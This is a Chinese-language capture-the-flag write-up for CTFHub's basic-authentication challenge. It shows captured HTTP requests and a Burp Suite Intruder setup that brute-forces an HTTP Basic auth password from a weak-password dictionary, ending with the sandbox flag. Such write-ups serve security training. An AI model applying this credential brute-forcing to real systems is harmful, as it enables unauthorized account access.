# CTFhub-基础认证

## 题目内容

```
CTFHub 基础认证
Here is your flag: click
```

同时给出了一份弱口令字典

## WriteUp

这道题是爆破无疑，使用Burpsuite抓包

我们做一次登录抓包，内容如下

```
GET /flag.html HTTP/1.1
Host: challenge-323e54997d1e474a.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge-323e54997d1e474a.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17b672c96fe74f-01ab585fa1d62c-3d740e5b-1fa400-17b672c96ff412
Connection: close
```

在repeater给出的返回结果中，得到

```
WWW-Authenticate: Basic realm="Do u know admin ?"
```

所以用户名可以确定为admin

然后我们尝试爆破密码，分析以上数据包我们传入的帐号密码变成了YWRtaW46YWRtaW4=

经过Base64解密可以得到admin:admin，也就是username:password这个格式

现在有两个思路

1. 使用burpsuite配置字典爆破
2. 编写脚本，将字典base64对应的字典生成出来，再使用Burpsuite爆破

方便起见，我们使用第一个

我们先将数据包send to intruder,然后配置字典域，使用$$括起来需要爆破的地方

```
GET /flag.html HTTP/1.1
Host: challenge-323e54997d1e474a.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Authorization: Basic §YWRtaW46YWRtaW4=§
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge-323e54997d1e474a.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17b672c96fe74f-01ab585fa1d62c-3d740e5b-1fa400-17b672c96ff412
Connection: close
```

在payload-options导入字典

![image](/home/adian/note/Study_Note/网络安全/CTF/pic/1.png)

然后在processing 处添加规则

![image-20210821152400482](/home/adian/note/Study_Note/网络安全/CTF/pic/2.png)

然后再添加一个base64_encode的规则

添加完成后开始爆破密码

![image-20210821152708136](/home/adian/note/Study_Note/网络安全/CTF/pic/3.png)

得到密码，我们回到repeater进行发包

得到flag

```
HTTP/1.1 200 OK
Server: openresty/1.19.3.2
Date: Sat, 21 Aug 2021 07:28:00 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Last-Modified: Sat, 21 Aug 2021 07:08:40 GMT
ETag: W/"6120a678-21"
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *
Content-Length: 33

ctfhub{aedef988b686febd6ff01670}
```

